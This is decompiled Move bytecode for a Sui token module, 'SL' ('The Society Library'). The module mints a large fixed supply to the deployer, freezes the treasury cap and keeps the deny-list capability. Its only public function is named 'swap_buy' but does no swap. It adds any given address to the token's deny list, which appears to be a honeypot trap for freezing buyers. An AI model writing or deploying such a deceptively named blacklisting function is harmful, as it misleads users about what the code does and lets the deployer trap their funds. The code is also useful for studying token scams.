module 0x3f8c6912ef3675c065d26690915843ed0d2a658ed8e77caec66124e27aa5c1f1::sl {
    struct SL has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: SL, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SL>(arg0, 9, b"SL", b"The Society Library", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmYK2EpTiGuRE2HgVHTATdXxvGrVdw5z59xp4GpazjxTdN"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<SL>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SL>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<SL>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SL>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SL>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SL>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

